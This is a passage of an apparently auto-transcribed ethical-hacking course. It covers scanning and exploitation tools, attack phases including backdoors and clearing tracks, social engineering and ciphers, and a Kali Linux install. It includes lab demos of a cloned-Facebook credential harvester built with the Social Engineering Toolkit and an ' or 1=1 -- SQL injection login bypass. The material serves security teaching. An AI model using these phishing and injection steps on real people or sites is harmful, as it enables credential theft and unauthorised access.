databases of all the vulnerabilities
that have already been identified at the
scan the network against that database
to find out any possible flaws or any
possible vulnerabilities that currently
exist on the host or the operating
system or on the network similarly there
would be application scanners like
acunetix or arachne that would help you
scan applications and identify flaws
within those applications as well now
all of these are automated tools the
essence of ethical hacker is when these
tools churn out the reports the ethical
hacker can understand these reports
analyze them identify the flaws and then
craft their own exploits or use existing
exploits in a particular manner so that
they can get access or they can bypass
the access or security controls
mechanisms that are already in place how
can they do that with the tool called
metasploit you see that big m there on
the right hand side that m logo is for a
tool called metasploit which is a
penetration testing tool what is a
penetration testing tool it is that tool
that will allow an ethical hacker to
craft their exploits or choose their
exploits for the vulnerabilities that
have been identified by nessus since we
are interacting with computers we will
always be interacting using tools right
so the first tool nessus identifies the
flaws and the possible list of
vulnerabilities we do a penetration test
using metasploit to validate those flaws
and to verify that those flaws actually
exist and try to figure out the
complexity of those flaws and that's
where metasploit helps us do that
wireshark would be used in the
background while we are doing both the
activities using nessus or metasploit to
keep a track of what packets are being
sent and by received on the network
which will help us analyze those packets
so whenever i run an ss scanner i would
run a wireshark in the background it
will capture the data packets and i can
go through those data packets and
analyze that data packets to identify
what nessus is actually trying to do
similarly when i try to attack a machine
using exploit on metasploit i will keep
on wireshark running in the background
to capture the data package that have
been sent and the responses that i've
received from the victim so that i can
also go through those packets and
analyze the responses and analyze the
attack whether it was successful to what
extent was it successful and
basically will also give me a validation
of proof of the activity that has
happened nmap is another automated tool
that allows me to scan for open ports
and protocols so why would i use nmap
because pro ports and protocols become
an entry point for a hacker to gain
access to devices for example when we
connect to a web server we connect
through a web browser but we
automatically connect to port 80 using
http and port 443 is using https so if i
am connecting to a web server using
https it is safe to assume that port 443
on the web server is open to accept
those connections similarly there would
be other services that may be left open
on the web server because nobody thought
about configuring it or they
misconfigured the web server and they
left unwanted services running so nmap
will allow me to scan those ports and
services and allow me to understand what
services are being offered on that
server so then i can start analyzing
that server identify those flaws within
those services and then try to attack
them if the application that i'm
analyzing is connected to a database and
i want to do a sequel injection attack
or if i if nessus tells me that there is
a sequel injection attack that may be
possible on that particular application
i can use an automated tool called sql
map or sql map that would allow me to
automatically craft all the queries that
are required for a sql injection attack
and help me do that attack at the same
time so here i do not have to manually
create my own queries uh the sql map
tool would automatically create them for
me what i would do is i would use nessus
to identify that particular flaw if
necessary that flaw i would then go use
the tool sql map configure it to attack
that particular web server and when i
fire off the tool it will then
automatically start directing queries
sql injection queries to the database to
see if those databases are vulnerable
and if yes what data can be retrieved
from those databases so all of these
tools in a nutshell would help me hack
networks applications operating systems
and host devices and this is what the
ethical hacker does they use these kind
of tool sets they identify what attacks
they need to do they identify the right
tool for that particular attack and they
write their exploits they create those
attacks and then they start attacking
analyze the response and then give a
report to the management uh providing
them feedback about how the attack was
created or crafted what was the response
to that attack and whether the attack
was successful or not if successful they
would also give recommendations of what
to do to prevent these attacks from
happening in the future so when we are
doing these attacks or when we want to
launch these attacks what is the process
that we would follow so there are six
steps that we would do as an ethical
hacker if you are just a hacker you
probably wouldn't do the sixth step
which is a reporting step so the first
step that would be done is the
reconnaissance phase which is the
information gathering phase which is
very important from ethical hackers
perspective or a hacker's perspective
because if i want to attack someone or
something as a digital device i need to
know what i'm attacking i need to know
the ip address of the device the mac
address of those devices i need to know
the operating system the build or the
version of that operating systems
applications on top the versions of
those applications so i know what i'm
attacking for example if i if i want to
attack a server i assume it's a windows
based server and i use a particular tool
to attack it but it actually turns out
to be a linux based server my attacks
are going to be unsuccessful so i need
to focus my attack based on what is
there at the other end so in my
information gathering phase i want to
identify all of that information once i
have that information done i'm going to
scan those servers using tools like nmap
that we just talked about and we're
going to try to see the open ports open
services and protocols that are running
on that server that can give me possible
entry points within the network or
within the device or within the
operating system at the same time along
with the scanning with nmap i would run
a vulnerability scanner the necess
vulnerability scanner we talked about or
acunetix for applications and then i
would try to identify vulnerabilities in
those applications operating systems or
networks once i have identified those
vulnerabilities in the scanning phase i
would then move on to the gaining phase
where i would then craft my exploits or
choose existing exploits and start
attacking the attacking the victim at
this point in time if my attack is
successful i will probably have gained
access
by either tracking passwords or
escalating privileges or exploiting a
vulnerability that i may have found
during the scanning phase once i have
gained my access i want to maintain my
access why because the vulnerability may
not be there for long maybe somebody
updated the operating system and hence
the flaw was no longer exist or existing
or somebody change the password that we
have i may have cracked does i no longer
have access so what do i do to maintain
my access i install trojans or backdoor
entries to those systems using which i
can secretly in a covert manner get
access to those devices at my own will
at my own time as long as those devices
are available over the network so that's
where i maintain my access i have hacked
them now i want to maintain my access so
i install a software which would give me
a backdoor entry to that device no
matter what once i have done this i want
to clear my track so whatever activity
that i've been doing for example
installing a trojan a trojan is also a
software that would create directory
directories and files once installed on
the victim's machine so i want to hide
that if i have access data stores if i
have modified data i want to hide that
activity because if the victim comes to
know that something has happened they
would start they would start increasing
their security parameters they might
start scanning their devices they may
take them offline thus my hack would no
longer be efficient the reason i'm
clearing my tracks is that the victim
doesn't find out that they have been
hacked or they have been compromised or
even if they do find out that they've
been compromised they cannot trace the
compromise back to me so i would be
deleting references of any of the ip
addresses or mac addresses that i may
have used to attack that particular
device and this is where i will be able
to identify where those logs were
created where those traces are once i
take off those traces the victim would
not be any visor of whether they have
been compromised or who compromised
their system and if i am successful at
all of these stages or what to whatever
extent the success that i've achieved in
any of these stages i would then create
a report based on that and i would
report to the management about the
activities that we have been able to do
and whatever we have been able to
achieve out of those activities for
example we identified 10 different flaws
there were 20 different attacks that we
wanted to do what attack did we do what
was the outcome of that attack what was
the intended or the expected output of
that attack i'll create a report which
would give a detailed analysis of all
the steps that were taken along with
screenshots and evidences of what
activity was conducted what was the
output what was the expected output and
i would submit that report to the
management giving them an idea of what
vulnerabilities and flaws exist in their
environment or their devices that need
to be mitigated so that the security can
be enhanced so these are the six steps
that the ethical hacking process would
take uh just going through this
uh recognizance is where you're going to
use hacking tools like nmap hp to obtain
information about targets there are
hundreds of tools out there depending on
what information you want then in
scanning again nmap nexpose these kind
of tools to be utilized to identify open
ports protocols and services in gaining
access you're going to exploit the
vulnerability by using the metasploit
tool that we talked about in the
previous slides in the maintaining
access you're going to install back
doors you can use metasploit at the same
time you can craft your own scripts to
create a trojan and install it on the
victims machine once you have achieved
that clearing tracks is where you're
going to clear all evidences of your
activity so that you do not get caught
or the victim doesn't even realize that
they have been hacked and once you have
done all of this we are going to create
reports that are going to be submitted
to the management to help them
understand the current security
evaluation of their organization so now
let's see how we can hack using social
engineering now what is social
engineering social engineering is the
art of manipulating humans into
revealing confidential information which
they otherwise would not have revealed
so this is where your social skill and
your people skills come into the picture
if you are able to communicate
effectively to another person they would
probably give up more information that
they intended to give out let's take a
look at examples right if you see on the
screen fishing activity what is phishing
we receive a lot of frequents on a
regular basis we have always received
those emails where we have won a lottery
of a few million dollars but we have
never realized that we didn't purchase a
lottery to win a lottery in the first
place we have always had those nigerian
frauds where a prince died in some south
african country and u out of seven
billion people on the planet have been
identified where they want to transfer a
few hundred million dollars through your
account and they want to give you fifty
percent of that money in return as thank
you so some very basic attacks where you
go onto websites and there's a banner
flashing at you saying congratulations
you're the one millionth visitor to this
website click here to claim your price
all of these are social engineering
attacks phishing attacks fake websites
fake communications being sent out to
users to prey on their gullibility most
of humans always have that dream of
striking it rich winning a huge lottery
once and for all and living their life
lavishly ever after but sadly in the
real world that's not that doesn't
happen that often and if you're
receiving those mails it is very
important that you first research the
validity of those those communications
before you even want to act upon them so
why are humans susceptible to social
engineering because humans have emotions
machines do not try pleading with the
machine to give you access to a account
that you have forgotten a password to
the machine wouldn't even know what
you're doing try pleading with a human
sympathy or empathy where you could try
to create a social engineering attack
where you can plead with them saying if
i do not get access to this account
immediately i might lose my job and then
that would put my family into problems
somebody would feel empathy or sympathy
towards you and help you reset that
password and give you access to that
account it's how good the attack is and
how convincing you are for the success
of this attack to happen so what is a
familiarity exploit attackers interact
with victims to gain information which
will benefit the attackers to crack
credentials as passwords if we want to
reset our passwords what do we have as a
mechanism to resetting passwords we have
some security questions that we set up
those questions are nothing but personal
information that we would know but
through a social engineering attack it
would be easily be able to uh gather the
information that you have set for your
security questions the security
questions can be as simple as the first
school that you attended you probably
have that listed on your linkedin
profile where a person can just go in
there and see your academic
qualifications and identify the school
that you're in right similarly it might
also be a question what was your
mother's maiden name that's a very good
attack and that's uh i mean if a person
can interact with you let's say they are
trying to take a survey and they
approach you for a feedback on a
particular product that you have been
utilizing and they ask you these
questions you wouldn't think twice
before giving those answers as long as
the request sounds legitimate to us we
are able to justify that request we do
answer those queries so it's upon us to
verify the authenticity of the request
coming in before we answer it phishing
as discussed would be fraudulent emails
which appear to be coming from a trusted
source so email spoofing comes into mind
uh fake websites and so on so forth
exploiting human curiosity curiosity
killed the cat right so there was
there's so many physical attacks where
hackers just keep pen drives lying
around in a parking lot now this is an
open a generic attack whoever falls
victim will fall victim so if i just
throw around a few usbs in the parking
lot obviously with trojans implemented
on them some people who are curious or
who are looking for a couple of freebies
might take up those pen drives plug them
in their computers to see what data is
on the pen drives at the same time once
they plug in those pendrives on their
computers the virus or the trojan would
get infected and cause harm to their
machine then exploiting human greed we
just talked about the
nigerian frauds and the lotteries those
kind of attacks the fake money-making
gimmicks now basically this is where you
prey upon the person's greed kicking in
and they are clicking on those links in
order to get that money that has been
promised to them in that email so one of
the safest mechanism to keep data
private and to keep yourself secure is
using encryption now encryption can
happen through cryptography what is
cryptography cryptography is the art of
scrambling data using a particular
algorithm so that the data becomes
unreadable to the normal user the only
person with the key to unscramble that
data would be able to unscramble it and
make sense out of that data so we're
just making it unreadable or
non-readable by using a particular key
or a particular algorithm and then we're
going to send the key to the end user
the you end user using this uh same key
would then decrypt that data if anybody
compromises that data while it is being
sent over the network since it is
encrypted they would not be able to read
it so the encryption algorithm would be
something like this now if you see uh
the computer word once made into
unreadable format would
look like e q o r x v g t for an end
user it wouldn't make any sense but the
person who has a key to unscramble that
would be able to convert it back to
computer and then understand the meaning
of that word so this is just a
substitution cipher that is being shown
on the screen so what is the alphabet
the key is alphabet plus three so c plus
three alphabets that becomes e o becomes
q m becomes o so the key that is
utilized to scramble the data is the
character that you are at the third
character from there would be the
corresponding key so the encrypted
message is also known as a cipher the
decryption is just the other way around
where you know the key now and you can
now figure out what that e corresponding
to by going back three characters in the
alphabet most of the times a certified
ethical hacker must decrypt a message
without knowing the secret key so let's
say a ransomware has affected your
organization or has affected a device
and you want to figure out or you want
to decrypt that data now as an ethical
hacker you wouldn't be for paying a
ransom to the hacker would you so it is
now your prerogative of how you're going
to work around and how you're going to
try to crack the encryption mechanism
how to crack the cipher to decrypt that
message and see what's within it right
decryption without the use of a secret
key that is known as a cryptanalysis
cryptanalysis is the reversing of an
algorithm to figure out what the
decryption was uh without using a key so
cryptanalysis can be done using various
formats the first one is a brute force
attack second is a dictionary attack
third one is a rainbow table attack a
brute force attack is trying every
combination permutation and combination
of the key to figure out what the key
was it is 100 successful but may take a
lot of time a dictionary attack is where
you have created a list of possible
encryption mechanisms a list of possible
cracks and then you try to figure out
whether those cracks work or not rainbow
tables are where you have an encrypted
text in hand and you're trying to figure
out uh the similarities between between
the text that you have and the encrypted
data that you wanted to decrypt in the
first place so in the brute force attack
you're trying every possible combination
permutation of what the key would be in
dictionary attack you have a word list
that would tantamount to the key and if
you're trying to match all the words
listed in the text file or the word list
to see if any of those words are going
to work to decrypt that data here in the
rainbow table the ciphertext is compared
with another ciphertext you find out
similarities and then you try to work or
reverse engineer your way accordingly so
let's have a quick demo on cryptography
before we end this session so to begin
with the demo of cryptography we are on
our website called spammic.com which
will help us scramble the message that
we created into a completely uh format
which would be unrelated to the topic at
hand so if i say i want to encode a
message i turn a short message into spam
so what this does is you want to send
across a secret message you type in the
secret message a short one it will
convert that into a spam mail you send
it across so whoever's reading that spam
mail would never get an idea of the
embedded message within it so if i want
to type in a message here hi this is a
secret message the password is asd at
the rate one two three four and i want
to send this out to people or to one of
my colleagues but i want to send it out
in a secret manner so that others are
not aware of this so when i press on
encode what the algorithm will do is it
will convert this message into a spam
mail so my message hi this is a secret
message the password is at the rate one
two three four or asd at the rate one
two three four gets converted into this
now if you read it dear e-commerce
professional this letter was specially
selected to be sent to you this doesn't
make sense there is nowhere or no
reference to the actual message that
i've already said so if i copy this
entire message and i send it let's say
via email to the recipient now the thing
is that the recipient needs to know that
i've encoded it using spam mimic the
algorithm needs to remain the same so
once they know that it is spam mimic
what they can do is now in this instance
what i'm going to do is i'm going to
open up a new browser and i'm going to
go to the same website and at this point
in time i'm going to click on decode
when i click on decode i'm going to
paste the message that i have just
copied there we are and this message is
now being copied into a different
browser and if i decode this you will
see that it will convert it back to the
original message that there was so the
key is there at spam mimic and it is
embedded within the message so whenever
we paste the message in the decode
factor it knows what the key was and it
can decrypt that message and give me the
actual message that was embedded within
it there we are the entire message this
is what we created in the google chrome
browser and in the firefox browser we
decoded similarly if i want to protect
these kind of messages there is an aspen
encrypt.com website where let's say we
use text encryption and i want to
encrypt the same message this
is a secret message the password is asd
at the rate one two three four and then
i give it a password to protect this
message let's say the word password and
i use the cipher to scramble this by
using let's say aes which is the
strongest cipher right now and i say
encrypt so this is what the encryption
would look like and basically if i don't
have the password over here if i decrypt
it you would see that the error has
occurred if i type in the password over
here and then decrypt it it will be able
to convert that back into the
unscrambled text and it will give me
what the original message was this is a
secret message the password is asd at
the rate one two three four so if i want
to keep my data secure from hackers i
want to scramble it in such a way that
they would not be able to crack it or it
would be very difficult for them to
crack it and this is one of the first
mechanisms that would be recommended by
any ethical hacker to keep the data
secure now let's talk about downloading
and installing kali linux along with
that we'll also be looking at the basic
commands that are required for kali
linux all right so i've opened my
browser and we want to go to the kali
website so we want to go to kali.org
you can directly type in kali.org and go
to the website i can just do a google
search and say kali download and it will
give you the same website but it will
directly take you to the downloads pages
so either here and or you can go to the
home page uh cookies are being installed
on your machine so uh see which cookies
you want to allow i'm only going to use
the necessary cookies to support this
site and you can see that this gives you
the latest kali linux news and tutorials
gives you the latest release what is in
that release and gives you a lot of
documentation which will help you
understand what tools have been
developed and what functionality has
been given in the latest version if you
want to download you can directly go
here and you can download kali linux now
curry linux is a 2.6 gigabyte download
so it's going to take time the latest
version being 2019.4
and we click over here i'm using a
download manager to manage all these
huge downloads and you can see it's
pointed to the operating systems folder
and it is going to be a 2.57 gb download
so you click on download and in the
background uh you can see this is going
to be downloaded and you're going to
minimize this and it will take a few
minutes for that to download but this is
an iso image so we need to install it on
a virtual machine so what we need is we
need to use a hypervisor which will
allow us to create virtual machines so
we can either use vmware workstation
which you can download from here however
this is paid version so you can see it
is around 250 or something for this
software but it is a very good software
to have so if you click on download now
it is going to start the download it's a
30-day trial period if you want to use
it after 30 days you'll need to enter
the key which you'll get after
purchasing the software if you do not
want to utilize this the free version
that you have you can either download
vmware player but there are some
limitations for vmware player that you
might want to look at does you want to
compare these products before you want
to purchase them right otherwise you can
download oracle virtualbox which is a
free hypervisor it's not as robust as
vmware workstation but it does the trick
right so the the free version 6.1 is
free and you can then create your own
virtual machines over there and install
operating systems on them what i do have
i already have a vmware workstation
installed so i'm just going to open that
up and that's my vmware workstation as
you can see i already have a lot of
virtual machines created over here what
we are going to do is we are going to
configure a virtual machine for the kali
linux operating system that we are
downloading
which should be somewhere here let's see
it's at 43 percent so
halfway there till then let's create the
virtual machine so i click click on file
create a new virtual machine i'm going
to customize the machine so click on
next this little default we don't want
to change that and then we want to
install the operating system later we
don't want to point it out right now so
i'll just click on i will install the
operating system later click on next we
want to install linux now in the drop
down you would not see kali linux over
here however you can choose ubuntu
64-bit that's what i'm going to choose
there it is next
what is the name that we want i want to
give it kali linux without the typo and
i want to store it in one of the folders
that i've created by default it stores
on the c drive which is not a good place
to store uh you don't want to run out of
space on your c drive so i'm going to
click on this pc and
this is my data and in here i'll have a
folder called virtualbox or virtual
machines there it is within which you
can see the other softwares that i
already created i'm going to need to
create a new folder and call it kali
2019 l l for it is latest for me because
you can see already have a kali linux so
i'm just going to identify this folder
with the l at the end going to select it
and click on okay you can see the path
being changed over here click on next
it's going to ask you how many
processors now depending on the
processor that you have you can see i've
got a 8 core i7 so if i give it 16 cores
or 16 processors that's not going to
work i cannot go beyond what the
physicality already is so for this
machine one processor with one core is
more than enough if you're going to load
use a lot of tools at the same time you
might just want to give it two cores so
you're giving it two cores it will ask
us for ram to be provided for this
virtual machine by default 2048
megabytes that's 2gb of ram is more than
enough if you require more we can change
this later on so click on next we want
to use nat for now leave this default
next whatever is recommended keep it the
way it is we do not want to change it
next create a new virtual hard disk for
this machine and it is going to ask us
the size 20 gb is more than fine store
it as a single file you don't want to
use multiple file options click on next
and then click on browse wherever you
want to store the vmdk file or the
virtual hard disk file and we go back
again to the same folder that we had
created virtual machines and we look at
the kali linux kali 2019 l and we want
to store the vmdk file over there once
we save it we want to click on next and
then we want to click on finish so this
is the virtual machine that has been
created right here right now this is the
basic configuration now where are we at
with the operating system and you can
see the operating system has been
downloaded and it is stored in this
particular folder so you go to e drive
so we're looking for the sub the
operating system that we have downloaded
we downloaded in the operating systems
folder and if we go in here you can see
the current one the kali linux
iso right here so what we do we go back
to the kali linux machine that we have
created edit virtual machine settings
and we point this virtual machine using
the cd dvd and then we point the iso the
one that we downloaded over here so we
go back to e drive we go back to os and
we click on kali linux 2019 click on
open so now when this boots up it will
boot up with this iso and then it will
allow us to install the operating system
so click on ok then we click on power on
this virtual machine it will start
powering on it will boot to the iso and
it will start giving us the booting
options so i'm just going to
enter the full screen mode over here for
this to be better visible and we don't
want the live mode what we want is we
want to use the graphical install and
then we highlight that we press enter
and you can see the setup starting up
we'll wait for the gui to pop up there
it is which language do we want for now
we want english click on continue where
are we located click on continue and the
configure your keyboard we want the us
keyboard american english continue it is
going to detect the hardware so as you
can see on the screen it's attempting a
auto configuration for most of these uh
settings the network with dhcp it has
identified the network cards uh hardware
like uh the processor that has been
provided that is asking for a host name
we're going to leave it at default we're
going to click on continue domain name
i'm not joining this into a domain as
yet there's going to be a standalone
machine so i can leave this blank click
on continue now it's going to configure
the network it is asking for a password
at this point in time the root password
type in any password that you want
ensure that you remember the password
now by default the username for the
account is the name is the word root we
are just creating the password for the
root account and then we want to click
on continue setting up the clock looking
at the hard disks now here it asks us do
we want to use the entire disk the 20gb
virtual hard disk that we had provided
or do we want to give it a manual
configuration or a guided one where we
want encryption and a logical volume
management coming into the picture we're
just going to use the first option
guided you use entire disk don't worry
it's only going to use the virtual disk
that we had created click on continue it
will give us that it's a 21.5 gb vmware
virtual disk that we had and click on
continue all files in one partition
that's what you want recommended for new
users whatever it is we don't want to
change these folders continue and this
is what we have configured once we click
on continue it is going to say you are
you sure you want to make these changes
click on yes click on continue and it
will start installing kali linux on your
device now this is going to take a few
minutes for the installation to work all
right so that's the installation that's
completed now it's asking us to
configure a package manager a network
mirror can be used to supplement the
software that is included on the
installation media this may also make
new versions of software available you
want to use a network mirror we can
click no for now and then click on
continue now this is going to install
the grub bootloader this might take a
few minutes as well install the group
grub loader to the master boot record
yes click on continue click the hard
disk that you have just utilized this is
the one click on continue it will
install the grub book loader running
through the last phases of the
installation and now it says the
installation is complete we want to
click click on continue finishing the
installation and then it will do a
reboot all right and okay you can see
this is starting up so we are going to
use you just wait out the boot and now
it started the booting sequence just
going to maximize the screen and you can
see it's asking me for the password this
is the one that we created now that's
the that's not the password that's the
username that's the root and the
password that we had created at that
point in time and then click on log in
and this is your screen uh now what we
need to do here is we need to install
vmware tools which which will help us
manage the screen and help the virtual
machine to be a little bit better uh
integrated on the system so that's
not mounted yet so we're just waiting
for it to mount there it is and what we
want to do here is open vmware tools
upgrader all right so what we want is we
want to extract or we want to use this
open x archiver and once we do that
we'll see the vmware install.pl double
click on that all right we've got the
vmware tools here what i've done is we
have extract2 and i've extracted that on
the desktop right so what we just did
was click on the desktop over here open
and this is what it will do and click on
extract now there is happening because
i've already extracted this open this up
we want to run this vmware install dot
pl so what do we do we open up the
terminal window which is the command
line interface over here and now this is
where some of the commands come into the
picture so for example pwd will show us
the present working directory ls will
show us the list of the folders that are
there so the folder that we have is on
our desktop so we'll just change
directory to desktop press enter do an
ls that will show us the list and you
can see vmware tools distrib that's the
folder that we have right here right so
we want to go into that folder see the
vmware at this point you can just click
on tab and it will populate everything
over there press enter do an ls and we
want the vmware hyphen install dot pl to
be executed all right so we tried
executing that command we had an error
over there so what we need to do is we
need to execute this command so dot
slash vmware in the hyphen install.pl
and we'll start creating now uh it will
ask you for your input installing vmware
tools in which directory do you want to
install the binary files uh by default
it is going to use slash usr slash bin
if i just press
enter it is going to use the default as
you can see the input over here what
directory do you want the init
directories i'm just going to press keep
on pressing enter for the defaults to
come in this part does not exist it is
going to create it default yes defaults
everywhere and then it tries to start
initializing it to maximize the screen
and this is where it is installing and
you can see by just installing that it
automatically adjusted the screen and
now we got a full screen of kali linux
right here right and that is what vmware
tools does for us once we have installed
the operating system and now you can see
the entire screen on here you will see
the tool sets that are given here now
why are we using kali linux in the first
place because this comes in uh with a
bundle of thousands of softwares that
are ready to be utilized for ethical
hacking right and they have been
categorized over here for information
gathering vulnerability analysis web
application analysis and so on so forth
so you can see from forensics onwards
reporting tools and as you scroll down
you can see your development tools
graphics coming in internet and the
system configuration coming into the
picture these are your settings for your
operating system so these are basically
your tools we are writing on the
favorites if i click on information
gathering you will see that other tools
for information gathering start
appearing over here for vulnerability
analysis we have got sparta and map
fuzzing tools web application analysis
we have got comics skip fish sql map
database assessments password attacks
and so on so forth so if you just go in
the favorites this was the terminal
emulator that we utilized is the command
line that we saw we used the cd command
we used the pwd command we did the ls
command as well to give us the list of
the directory that we are in similarly
there would be commands like cat so
let's go to cd downloads let's see what
the uh what's there i can see this case
sensitive so if i type in a capital d
and then do a tab ls there's nothing
over here on download so cd dot dot will
take us back one directory i can see we
are back from downloads to root if i
want to go to desktop this is how i go
to desktop do a ls you can see the
vmware tools uh folder over there cd
vmware tools and we go into that folder
ls which will give us the list of all
those files now you can see install is a
file that we had edited back then so if
i do a cat install you will see the cat
basically is the command that will help
us look at the contents of the file all
right without opening up the file or
without editing the file so you can see
just uh if i scroll up this is where we
gave the cat command it then
printed the contents of the file over
here and then it exited and gave me back
to command line right here right now if
i want to copy this cp root desktop
vmware install and if you want to copy
it to root downloads and press enter now
what we are going to do is we are going
to see if this file the install file
that we just edited over here has been
copied to the downloads folder so we do
us we are currently in the vmware on the
desktop vmware tools district folder
video cd dot dot that takes us down one
directory so we are still in the desktop
do a cd dot dot now you can see we are
back in the root and now we are going to
do a cd downloads to an ls and you can
see the copied file right here so if i
do a cat install you can see the same
content of that file coming in so these
are some of the commands that we would
need to learn as we go ahead the remove
command is
let's say we've got install we do a man
rm man is the manual page command that
gives us the
pages with the description of how that
particular command is to be utilized so
rm is remove files or directories
synopsis the description the options
hyphen f4 hyphen i for prompt hyphen
capitalize prompt once before removing
more than three files and so on so forth
if you want to exit this you can press q
to exit and you come back to this page
so if i say rm install
ls you will see that the install file
has now been deleted so in windows we
use the del del command in linux it is
the rm command so this is what we wanted
to look at the demo for kali linux how
to download it how to install it and
some of the basic commands that we can
utilize let's look at the practical at
this point in time for phishing all
right let's begin with the fishing uh
tutorial we have the kali linux
operating system booted up over here uh
what we are going to do is we we're
going to open up a tool called
set social engineering toolkit which you
would find in this option and that's the
tools that we want it's a command line
tool a menu driven tool we are going to
host a fake facebook page and you can
see how we can harvest credentials by
this kind of an attack so these are some
disclaimers you might want to go through
that do you want to agree to the terms
of service yes
press enter and that's your social
engineering toolkit and we are talking
about a phishing attack which can comes
under the social engineering attack so
it like i said it's a menu driven tool
so we just have to look at these options
and then just type in the number of the
option that we want so we want to do a
social engineering attack so i type in
one press enter in that it is asking me
whether i want a spear phishing attack a
website attack vector we are going to
choose a second option so i type in two
press enter and then it asks me uh what
i want to do i want to take the third
option here credential harvester attack
methodology and we want to do the third
attack now it is asking whether we want
to use the in-house website templates
that it already has or do we want to
clone a site or do we have a customized
site that we have prepared that we want
to migrate into this tool we're going to
do the site cloning option so we're
going to type in two press enter and
then it is going to ask me the ip
address where it wants to capture and
store the credentials by default this is
the ip address that i'm using so if i
leave it blank it will take my default
ip address so i'm just going to press
enter and now it is asking me the url to
clone so i type in https
www.facebook.com what it is going to do
it is going to connect online and it is
now just it has cloned the website uh
facebook login.php the best way to use
this attack is that you if use the if
the username and password form are in
the same field or the same page
regardless this captures all posts on a
website so you may need to copy www.star
into html depending on where your
directory structure is press return if
you understand what we are saying here
so press enter the social engineering
toolkit credential harvest attack is
running on port 80 information will be
displayed to you as it arrives so the
site was
71.134 right the default ip address and
this is where the website is being
hosted let's check that out so let me
open up a browser on my host machine and
let me point it to the kali linux
machine that we have just created
192.168.71.134
and you should see a login to facebook
coming up right here looks genuine it is
genuine because we just went online and
downloaded this let's just have a recap
let's have an explanation of what we are
trying to do i am trying to host fake
facebook page on my server which has an
embedded script in it which is going to
do credential harvesting so the attack
here is let's say if i'm now hosted this
i can craft a fake email send it across
to a victim saying uh your facebook
account has seen some unforeseen
activity create a hyperlink using html
coding within that click here to access
your account and verify uh that the
account is secured and when they click
on that link they will be redirected to
my fake page which is here you can see
the ip address is my virtual machine's
ip address but i'm seeing a facebook
login page and i'm going to type in
someone at
somewhere.com and the password i'm just
going to type in the regular ones that i
use and if you see it when we typed in
uh the username and password the page
just refreshed and gave us the login
page again but now if you look at the
url i'm actually on facebook's login
page which is exactly the same that i
was hosting so a layman wouldn't
probably figure out they've been hacked
by now they just would figure out okay
they probably typed in the incorrect
password and the page refresh or
something like that and they're just
going to log in and they're actually
going to access the facebook page thus
they might not even realize that
something went wrong but if i go back to
my virtual machine you can see that it
has captured some data and it is
reporting over here of what has happened
so if i just scroll up let's see what
happened here and if you have been able
to capture anything so we gotta hit
printing the output this does the http
1.1 200 okay response coming in password
field phone
and we just looking there it is email
someone at somewhere.com and
password that i typed in asd at the rate
one two three four so it has captured
the username and the password right here
uh once you're done i mean this is the
way attackers work now this is a very
basic attack again uh in the actual
trainings you would then look at how you
would host this on a real website make
it a global attack right now it's a
virtual machine with a class cip address
so here the thought process is where can
we get a free hosting where we can host
this kind of sites maybe i'll have to
purchase a domain which looks like
similar to facebook or the victim that
i'm trying to attack so this is just a
poc so we just wanted to find out if we
can uh how phishing is done and this is
exactly how it is done right so pressing
ctrl c would exit this tool and takes
you back to the actual menu press
99.99 to exit and
there it is close the two window and
that's
the fishing practical after fishing
let's talk about sql injection sql
injection stands for uh structured query
language injection which is a database
attack though it resides within the
application so it's the application
vulnerability that we are trying to look
at to try to bypass authentication as
the name suggests a sequel injection
vulnerability allows an attacker to
inject malicious input into a sql
statement what is a sql statement a
query that is used by an application and
is fired off to the database database
executes that query gets that
information that is required and sends
it back to the user if the user is
authenticated so we're going to look at
the sql injection attack demo here and
what we are going to do is we are going
to go back to our vmware workstation and
i have got a tool over here called ovas
broken web application which is a
utility that has been created for people
like us to test our skills to learn on
how we can develop our skills further so
this has a lot of vulnerable
applications built within it we're just
going to try to access it and we are
going to see if we can create a sql
injection attack just waiting for it to
boot up once it boots up it will give us
an ip address there we are so we need to
connect to 71.132
so i can just use the same browser i was
using close up facebook and now go to
192.168.71.132
and this is the ovap broken web
application project uh what we're going
to do is we're going to go to utility
and this is a application that has a lot
of information within it you can see it
gives you links about what you should do
help me video tutorials listing of
vulnerabilities that they have and so on
so forth so you can see we are not
logged in right now i'm just going to do
this as a demo so what we're going to do
is we're going to look at this and
bypass authentication so we are taken to
the login page where you need a username
and password to log in i'm going to type
in test as the username and test as the
password click on login and you can see
that account does not exist so the
authentication mechanism works now what
we want to do is we want to create a
query now what does a query look like
when i type in a username and a password
if i just type in a single quote here it
is going to create an error and this is
what the sql query looks like select
username from accounts where username is
a single quote and then the exception
error happened so it's not showing the
rest of the query to us now what i'm
going to do is i'm just going to craft a
query here a single quote and give it a
condition or one equals one space hyphen
hyphen space what happens hyphen hyphen
space is comments out anything after
that so the password field is being
commented out at this point in time and
i'm just giving it a condition where the
condition is true one does equal one and
if this condition is true it is going to
allow me to log in so you can see right
now we are not logged in this bypasses
the authentication mechanism and you can
see user authenticated and we are now
logged in as admin so uh in the training
what we need to understand
as a whole is how sql works what are the
queries that are structured with how you
can what are the testing operators now
the single quote that we used that was
an operator in the sql syntax what these
operators are how they function and then
how you can leverage these attacks there
are different tools that are given to
you in kali as well that you can utilize
so in kali linux you can just open up a
command prompt and there's a tool called
sql map you need to give it a particular
site so sql map hyphen u for the url and
whatever the url is now url here and
then once you're here you just press the
enter key this tool will craft all the
queries in the background for you you
don't even have to no sql query or sql
languages uh this is a very easy tool to
utilize sadly i cannot demo this on a
live website because that would be
illegal but you can
see how you can operate this yourself
that's what sql injections are all about
moving on we now talk about uh vpn's
virtual private networks and a virtual
private network is basically a secure
network that allows me to anonymize
myself over the internet so what i'm
doing is i'm connecting from here to a
server that encrypts my channel encrypts
my connection and does allows me to keep
my data secure now the basic essence of
a vpn or a virtual private network is to
allow me this encryption mechanism where
i can encrypt and safeguard my data the
added advantage that nowadays a vpn
gives is that they can allow us to spoof
our ip address or obfuscate our ip
address so we can actually become
anonymous on the internet it can allow
us to use multiple ip addresses and thus
secure ourselves on the internet for
example i use vpn called cyberghost and
what this allows me to do is it allows
me so many servers over here and if you
look at the entire list all the servers
then there are no spy servers which and
guarantee me that they are not going to
keep and store any logs and thus they
are not going to record any of the
activity that i'm doing right since they
are located out of romania this becomes
a little bit more safer for me because
the government and the laws over there
are a little bit more relaxed than other
countries uh they give me uh different
links for torrenting for streaming for
connection features so there are a lot
of vpns out there so for example let's
go to the website
cyberghost.com so we can see there's a
sale going on 76 percent sale or you can
go on to express vpn which is also very
good vp and then there is not vpn it
depends on what you want and how you
want to utilize it so just purchasing a
vpn or getting a free free vpn is not
enough it depends on which country the
vpn originates from and which server
you're connected to for example most of
